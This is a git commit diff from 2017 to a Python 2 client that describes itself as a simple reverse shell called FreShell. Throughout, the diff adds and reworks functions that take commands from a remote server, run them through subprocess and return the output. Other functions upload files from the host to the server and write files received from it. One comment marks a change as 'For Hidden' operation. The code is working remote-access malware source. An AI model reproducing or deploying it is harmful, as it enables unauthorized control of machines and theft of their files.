ac0c206d50c55ebdbf319c19faceb9d5c9924727
Freshnuts <fr3shnuts@gmail.com>
2017-07-09 15:21:19 -0700

    Upadted Client to work with Server Changes

--- freshell_client.py
+++ freshell_client.py
@@ -3,6 +3,8 @@ import socket
 import subprocess
 import sys
 
+# FreShell Client - A simple Python Reverse Shell
+
 host = '127.0.0.1'
 port = 443
 
@@ -18,39 +20,41 @@ def connect():
     except socket.error:
         print "[-] Cannot connect to server."
 
+# Interactive Shell		(For Hidden, shell=False)
+def command():
+    cmd = subprocess.Popen(srv_cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = cmd.stdout.read() + cmd.stderr.read()
+    s.send(output)
+    cmd.terminate()
 
+# Upload File
 def send_file():
-    name_f = s.recv(1024)
+    try:
+        name_f = s.recv(1024)
+    except socket.error:
+        print "[-] Cannot recover file name."
     print "Sending File: ", name_f
     snd_f = open(name_f, "rb")
     read = snd_f.read()
-    s.send(read)
+    try:
+        s.send(read)
+    except socket.error:
+        print "[-] Cannot send file data."
 
-
+# Recover File
 def recover_file():
     namef = s.recv(1024)
     word_l = namef.split("/")
     filename = word_l[-1]
     print "[+] Filename: ", filename
-    data_f = s.recv(10000)
+    try:
+        data_f = s.recv(10000)
+    except socket.error:
+        print "[-] Cannot Recover File."
     rcv_f = open(filename, "wb")
     rcv_f.write(data_f)
     rcv_f.close()
     print "[+] Retrieved File"
-
-
-def cd(s):
-    print "[+] Current Directory: ", os.getcwd()
-    os.chdir(s)
-    print "[+] New Directory: ", os.getcwd()
-    newdir = "[+] New Directory\n", os.getcwd()
-
-
-def command():
-    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    output = cmd.stdout.read() + cmd.stderr.read()
-    s.send(output)
-    cmd.terminate()
 
 def main():
     while True:
@@ -58,19 +62,19 @@ def main():
             global srv_cmd
             srv_cmd = s.recv(1024)
         except socket.error:
-            print "Cannot receive Command"
+            print "Cannot recover command"
         split = srv_cmd.split(" ")
         cd = split[0]
         path = split[-1]
         if srv_cmd == "quit":
             print "[-] Interactive Mode Disabled"
-        elif srv_cmd == "disconnect":
+        elif srv_cmd == "D1SC0NN3CT":
             print "[-] Disconnecting from server"
             s.close()
             exit()
-        elif srv_cmd == "snd_file":
+        elif srv_cmd == "rcv_cli":
             send_file()
-        elif srv_cmd == "rcv_file":
+        elif srv_cmd == "snd_cli":
             recover_file()
         # Change Directory & Interactive Shell
         else:
